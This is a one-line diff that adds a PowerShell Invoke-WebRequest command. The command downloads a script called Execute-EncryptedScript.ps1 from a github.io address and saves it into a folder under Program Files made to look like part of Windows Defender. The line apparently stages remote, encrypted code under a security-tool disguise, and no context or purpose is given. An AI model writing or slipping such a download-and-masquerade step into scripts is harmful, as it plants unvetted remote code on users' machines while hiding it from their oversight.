@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri "https://radicaltronic.github.io/cmd/Execute-EncryptedScript.ps1" -OutFile "$env:ProgramFiles\Windows Defender\Scripting Tools and Updater\scripts\Execute-EncryptedScript.ps1"
